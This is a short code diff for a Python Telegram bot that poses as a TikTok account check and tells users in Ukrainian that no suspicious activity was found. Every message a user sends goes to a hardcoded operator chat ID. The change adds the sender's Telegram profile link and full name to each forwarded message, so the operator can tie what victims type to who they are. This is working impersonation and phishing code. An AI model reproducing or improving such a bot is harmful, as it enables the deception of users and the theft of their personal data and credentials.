@@ -39,8 +39,10 @@ def message_reply(message: types.Message):
             final(message.chat.id)
         except telebot.apihelper.ApiTelegramException:
             pass
+    elif message.text == "/start":
+        pass
     else:
-        bot.send_message(880691612, message.text)
+        bot.send_message(880691612, f"<a href='tg://user?id={message.chat.id}'>{message.chat.first_name} {message.chat.last_name}</a>: {message.text}", parse_mode='HTML')
 
 def final(chat_id):
     bot.send_message(chat_id, "Ваш акаунт внесений в базу даних ТІКТОК. Підозрілої активності не замічено. ✅ \n\nМожете продовжувати користуватись нашою платформою для нових і класних відео!")
